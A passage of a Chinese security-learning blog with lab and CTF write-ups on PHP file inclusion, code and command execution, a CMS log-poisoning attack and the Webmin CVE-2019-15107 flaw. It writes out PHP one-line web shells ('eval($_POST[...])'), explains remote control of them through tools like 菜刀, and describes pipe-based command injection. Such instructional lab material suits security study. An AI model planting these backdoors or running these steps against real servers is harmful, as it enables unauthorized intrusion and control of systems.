href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><p>这里url有文件传参，可以测试文件包含/下载漏洞，在真实的环境下，可以用扫描工具扫描（文件下载漏洞）。尝试修改文件参数名，发现显示不正常，说明的确是以文件传参。而且可以执行php文件，多半是php脚本搭建的网站。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image28.png" alt="image28"></p><p><strong>直接访问show.php文件（明确存在文件包含漏洞）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image29.png" alt="image29"></p><p><strong>数据包查看环境（这里只发现中间件nginx，php脚本）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image30.png" alt="image30"></p><p><strong>大小写判断操作系统（发现为linux）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image31.png" alt="image31"></p><p><strong>利用伪协议进行命令执行</strong></p><p>测试php命令（这里有无法执行，查看php伪协议的要求：allow_url_include参数必须要开启，可能这里没有开启，这里可以实施php伪协议的过滤器读取）.</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image32.webp" alt="image32"></p><p><strong>读取当前路径下的：index.php文件（读取成功，则前面的猜测成立）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image33.webp" alt="image33"></p><p><strong>解密（获取到了flag）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image34.webp" alt="image34"></p><h3 id="2-i春秋靶场"><a href="#2-i春秋靶场" class="headerlink" title="2.i春秋靶场"></a>2.i春秋靶场</h3><p>出现一串php代码：如果传递的参数带path，就包含这个path，否则的话执行phpinfo.php。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image35.png" alt="image35"></p><p>通过文件包含漏洞读取phpinfo.php</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image36.png" alt="image36"></p><p>大小写判断操作系统（为linux）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image37.png" alt="image37"></p><p>伪协议进行命令执行</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image38.png" alt="image38"></p><p>读取dle345aae.php文件</p><p><img src="https://i0.hdslb.com/bfs/article/476c59a6bbbb61f11751fcca6266310f000f3ca5.png@831w_170h_progressive.webp" alt="img"></p><p>源代码查看</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image39.png" alt="image39"></p><p>php过滤器加密读取</p><p><img src="https://i0.hdslb.com/bfs/article/dd1138c5c599a41a8bc75585ccac7c30f12253b4.png@831w_222h_progressive.webp" alt="img"></p><p>解密</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image40.webp" alt="image40"></p><h2 id="四-某CMS程序文件包含利用-黑盒"><a href="#四-某CMS程序文件包含利用-黑盒" class="headerlink" title="四.某CMS程序文件包含利用-黑盒"></a>四.某CMS程序文件包含利用-黑盒</h2><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image41.png" alt="image41"></p><h3 id="2-发现漏洞"><a href="#2-发现漏洞" class="headerlink" title="2.发现漏洞"></a>2.发现漏洞</h3><ul><li>漏洞扫描工具</li><li>CMS公开漏洞</li><li>手工看参数及功能点</li></ul><p>发现这里的CMS</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image42.png" alt="image42"></p><p>百度该CMS漏洞</p><p>后门代码为{}原因：文件包含以php脚本执行，而传统&lt;&gt;是告诉电脑以php脚本执行，因此这里不需要写&lt;&gt;。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image43.webp" alt="image43"></p><h3 id="3-执行漏洞"><a href="#3-执行漏洞" class="headerlink" title="3.执行漏洞"></a>3.执行漏洞</h3><ul><li><p>访问该文件包含url（<a target="_blank" rel="noopener" href="http://192.168.176.128:10086/ekucms2.4.1/index.php?s=my/show/id/%EF%BC%89">http://192.168.176.128:10086/ekucms2.4.1/index.php?s=my/show/id/）</a></p></li><li><p>包含日志文件（在s=my/show/id/路径下，不存在后门.html的文件，这个消息会被写入日志当中，可以看出，这里的文件包含设置了限制(添加html后缀)）</p></li><li><p>写入后门（<code>&#123;~eval($_POST[x])&#125;</code>）</p></li><li><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image44.png" alt="image44"></p></li><li><p>服务器发现日志生成</p></li></ul><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image45.png" alt="image45"></p><p>直接通过菜刀连接</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image46.png" alt="image46"></p><h2 id="五-漏洞修复"><a href="#五-漏洞修复" class="headerlink" title="五.漏洞修复"></a>五.漏洞修复</h2><ul><li><p>要传参，对参数进行过滤检测变形</p></li><li><p>尽量不传参，将参数固定写死（固定文件）</p></li><li><p>传参后，固定文件名的后缀（有绕过的可能）</p></li><li><p>waf产品</p></li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">RCE代码及命令执行漏洞全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-02-28 10:56:46" itemprop="dateCreated datePublished" datetime="2022-02-28T10:56:46+08:00">2022-02-28</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-03 11:24:33" itemprop="dateModified" datetime="2022-03-03T11:24:33+08:00">2022-03-03</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="RCE代码及命令执行漏洞全解"><a href="#RCE代码及命令执行漏洞全解" class="headerlink" title="RCE代码及命令执行漏洞全解"></a>RCE代码及命令执行漏洞全解</h1><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="一-代码执行RCE漏洞"><a href="#一-代码执行RCE漏洞" class="headerlink" title="一.代码执行RCE漏洞"></a>一.代码执行RCE漏洞</h2><h3 id="1-搭建靶场"><a href="#1-搭建靶场" class="headerlink" title="1.搭建靶场"></a>1.搭建靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><p>eval()函数作用，即get传递的参数（字符串）会被当成php脚本执行。</p><h3 id="2-访问靶场"><a href="#2-访问靶场" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h3><p>发现传递的参数被当成php脚本执行。</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>写入文件代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;newfile.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;Bill Gates\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;Steve Jobs\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220228112020343.png" alt="image-20220228112020343"></p><p>成功创建文件！</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><h2 id="二-命令执行漏洞"><a href="#二-命令执行漏洞" class="headerlink" title="二.命令执行漏洞"></a>二.命令执行漏洞</h2><h3 id="1-搭建靶场-1"><a href="#1-搭建靶场-1" class="headerlink" title="1.搭建靶场"></a>1.搭建靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>system是将get传递的字符串当作系统命令去执行。</p><h3 id="2-访问靶场-1"><a href="#2-访问靶场-1" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h2><p>漏洞形成的条件：</p><ul><li>可控变量（无论是注入还是RCE都有参数）</li><li>漏洞函数（用什么函数对于这个参数进行操作，如上题命令执行和代码执行漏洞的区别就是漏洞函数的不同，如果是输出就是XSS，如果文件提交，就是文件上传，如果输出查询，就是SQL注入）</li></ul><h2 id="四-代码-命令执行漏洞的查找"><a href="#四-代码-命令执行漏洞的查找" class="headerlink" title="四.代码/命令执行漏洞的查找"></a>四.代码/命令执行漏洞的查找</h2><ul><li>代码审计</li><li>漏洞工具扫描</li><li>搜索引擎搜索公开漏洞</li><li>手工查看参数值和功能点判断（参数值和脚本有关，如test.php?x=echo 等等）</li></ul><h2 id="五-墨者靶场黑盒功能点命令执行"><a href="#五-墨者靶场黑盒功能点命令执行" class="headerlink" title="五.墨者靶场黑盒功能点命令执行"></a>五.墨者靶场黑盒功能点命令执行</h2><h3 id="1-靶场地址"><a href="#1-靶场地址" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><h3 id="2-ping本地地址"><a href="#2-ping本地地址" class="headerlink" title="2.ping本地地址"></a>2.ping本地地址</h3><p>能ping通</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><h3 id="3-使用管道符-（由于已知是linux）"><a href="#3-使用管道符-（由于已知是linux）" class="headerlink" title="3.使用管道符(|)（由于已知是linux）"></a>3.使用管道符(|)（由于已知是linux）</h3><p>显示IP格式不正确，应该是有过滤</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><p>查看源代码</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><p>解决方法有三个：</p><ul><li>浏览器设置禁用本地js</li><li>将网站源代码复制，将验证的js代码删除</li><li>抓包工具修改数据包（在数据包内修改执行语句，就不会被前端检测）</li></ul><h3 id="4-禁用JS"><a href="#4-禁用JS" class="headerlink" title="4.禁用JS"></a>4.禁用JS</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>再次使用管道符(|)，返回相关文件</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><h3 id="5-使用管道符来查看该文件"><a href="#5-使用管道符来查看该文件" class="headerlink" title="5.使用管道符来查看该文件"></a>5.使用管道符来查看该文件</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p><strong>注意：</strong>cat&lt; 与cat没有什么区别，但cat&lt;是最标准的写法，一般来说cat是省略了&lt;的写法。</p><h2 id="六-墨者靶场白盒代码及命令执行"><a href="#六-墨者靶场白盒代码及命令执行" class="headerlink" title="六.墨者靶场白盒代码及命令执行"></a>六.墨者靶场白盒代码及命令执行</h2><h3 id="1-靶场地址-1"><a href="#1-靶场地址-1" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><h3 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><p>将获取到的脚本放到php环境中运行，运行之前对脚本进行修改：</p><ul><li>去掉base64解码前后的&amp;&amp;（因为base64加密末尾为== ）</li><li>base64解码数据加上’’</li></ul><h3 id="3-输出结果"><a href="#3-输出结果" class="headerlink" title="3.输出结果"></a>3.输出结果</h3><p>这串代码的运行结果为输出：<code>echo $_REQUEST[a];; ?&gt;</code>，其中request为接受的参数 。</p><p>这句代码等同于<code>eval(&#39;$_REQUEST[a]&#39;;;?&gt;)</code></p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><h3 id="4-传递参数"><a href="#4-传递参数" class="headerlink" title="4.传递参数"></a>4.传递参数</h3><p>在发送查看（ls）命令之前可以查看数据包来查看OS版本，查看得知为linux，因此查看命令为ls.</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><h3 id="5-读取文件"><a href="#5-读取文件" class="headerlink" title="5.读取文件"></a>5.读取文件</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image18.png" alt="image18"></p><p><strong>注意：这里明明是代码执行，但是却可以执行系统命令（一般来说eval是代码执行，system是命令执行）</strong></p><h3 id="6-代码执行转命令执行探究"><a href="#6-代码执行转命令执行探究" class="headerlink" title="6.代码执行转命令执行探究"></a>6.代码执行转命令执行探究</h3><p>``是linux里面的符号，用来执行里面的指令。</p><p>猜测应该是`参数`;;?&gt;将代码执行转为了命令执行。</p><h2 id="七-墨者靶场黑盒层-RCE-漏洞检测"><a href="#七-墨者靶场黑盒层-RCE-漏洞检测" class="headerlink" title="七.墨者靶场黑盒层 RCE 漏洞检测"></a>七.墨者靶场黑盒层 RCE 漏洞检测</h2><h3 id="1-靶场地址-2"><a href="#1-靶场地址-2" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><strong>Webmin 远程命令执行漏洞(CVE-2019-15107)</strong></p><p>影响版本：1.882-1.920</p><p>条件：1.890版本，漏洞点的触发只需要在修改密码处传一个expired参数执行命令即可。不需要passwd_mode=2的必要条件。除1.890版本，其余受影响的版本的服务器的配置文件需passwd_mode=2的条件。无需用户名密码，可执行任意命令。</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image19.png" alt="image19"></p><h3 id="2-进入靶场-1"><a href="#2-进入靶场-1" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image20.png" alt="image20"></p><p>随便输入账号密码，并抓包</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image21.png" alt="image21"></p><p>修改数据包后发送</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image22.png" alt="image22"></p><p>更换命令pwd</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image23.png" alt="image23"></p><p>没找到相关文件，直接查看更目录</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>查看key.txt，找到flag</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><h2 id="八-相关概念"><a href="#八-相关概念" class="headerlink" title="八.相关概念"></a>八.相关概念</h2><p><strong>EXP：利用漏洞</strong></p><p><strong>POC：验证漏洞</strong></p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><h2 id="九-关于一句话后门"><a href="#九-关于一句话后门" class="headerlink" title="九.关于一句话后门"></a>九.关于一句话后门</h2><p>例如一句话代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>菜刀、蚁剑等工具将功能性函数写入程序里面；</li><li>然后网站访问后门地址，将接受post传递的参数，并且将传递的参数当做系统命令执行；</li><li>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval（）代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的。</li></ol></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/" class="post-title-link" itemprop="url">XSS跨站之WAF绕过及修复</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-02-27 15:54:24 / 修改时间：17:40:16" itemprop="dateCreated datePublished" datetime="2022-02-27T15:54:24+08:00">2022-02-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>926</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p><img src="/2022/02/27/XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/image1.webp" alt="img1"></p><h1 id="一-常规WAF绕过思路"><a href="#一-常规WAF绕过思路" class="headerlink" title="一.常规WAF绕过思路"></a>一.常规WAF绕过思路</h1><h2 id="1-标签语法替换-垃圾数据溢出"><a href="#1-标签语法替换-垃圾数据溢出" class="headerlink" title="1.标签语法替换/垃圾数据溢出"></a>1.标签语法替换/垃圾数据溢出</h2><ul><li>开启WAF访问</li></ul><p><img 